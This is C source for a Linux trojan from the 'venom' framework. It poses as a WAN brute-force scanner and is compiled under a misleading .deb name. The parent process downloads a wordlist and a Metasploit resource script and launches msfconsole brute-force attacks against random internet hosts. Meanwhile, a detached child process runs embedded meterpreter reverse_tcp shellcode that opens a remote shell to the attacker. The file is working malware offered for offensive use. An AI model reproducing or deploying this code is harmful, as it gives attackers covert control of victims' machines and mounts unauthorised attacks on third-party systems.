#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<sys/types.h>
#include<sys/wait.h>
#include<unistd.h>

/*
Author: r00t-3xp10it
Framework: venom v1.0.16
MITRE ATT&CK T1036 served as Linux RAT agent (trojan).
gcc -fno-stack-protector -z execstack orphan.c -o brute_force_wan.deb
"Naming the compiled C program to .deb does not call the dpkg at runtime (MITRE ATT&CK T1036)"
*/

/* msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -a x86 --platform linux -b '\x00' -f c */
unsigned char voodoo[] = "STRING_TO_BE_REPLACED_BY_SED";

int main()
{
   /*
   This fork(); function allow us to spawn a new child process (in background). This way i can
   execute shellcode in background while continue the execution of the C program in foreground.
   Article: https://www.geeksforgeeks.org/zombie-and-orphan-processes-in-c
   */
   fflush(NULL);
   int pid = fork(); 
      if (pid > 0) {
         /*
         We are runing in parent process (child its also running)
         runing brute_force.rc resource script (as foreground job)
         */
         printf("+----------------------------------------------------+\n");
         printf("| Scan WAN networks (random) for brute force targets |\n");
         printf("+----------------------------------------------------+\n\n");
         /* Display system information onscreen to target user */
         system("h=$(hostnamectl | grep 'Static' | cut -d ':' -f2);echo \"    Hostname :$h\"");
         system("c=$(hostnamectl | grep 'Icon' | cut -d ':' -f2);echo \"    Icon     :$c\"");
         system("o=$(hostnamectl | grep 'Operating' | cut -d ':' -f2);echo \"    OS       :$o\"");
         system("k=$(hostnamectl | grep 'Kernel' | cut -d ':' -f2);echo \"    Kernel   :$k\"");
         sleep(1);printf("\n[*] Start postgresql service ..\n");
         system("service postgresql start");
            /*
            Make sure file/script exist(s) remotely before downloading them.
            If they dosen't exist (remote) then download ALL file(s)/script(s) required.
            This function searchs/downloads files/scripts into remote working directory.
            */
            if (access("multi_services_wordlist.txt", F_OK) != -1) {
               printf("[i] Dicionary file found, no need to download ..\n");
            } else {
               printf("[+] Downloading dicionary file from github ..\n");
               sleep(1);system("wget -q https://raw.githubusercontent.com/r00t-3xp10it/resource_files/master/bin/multi_services_wordlist.txt");
            }
            if (access("brute_force.rc", F_OK) != -1) {
               printf("[i] Resource script found, no need to download ..\n");
            } else {
               printf("[+] Downloading resource script from github ..\n");
               sleep(1);system("wget -q https://raw.githubusercontent.com/r00t-3xp10it/resource_files/master/brute_force.rc");
            }
         /* Scan WAN networks (random) for potencial brute force targets */
         printf("[*] Scanning WAN (random) for potencial targets ..\n");
         sleep(1);system("msfconsole -q -x 'setg RANDOM_HOSTS true;setg USERPASS_FILE multi_services_wordlist.txt;resource brute_force.rc'");
      }
      else if (pid == 0) {
         /*
         We are running in child process (as backgrond job - orphan).
         setsid(); allow us to detach the child (shellcode) from parent (brute_force_wan.deb) process,
         allowing us to continue running the shellcode in ram even if parent process its terminated.
         */
         setsid();
         void(*ret)() = (void(*)())voodoo;
         ret();
      } return 0;
}
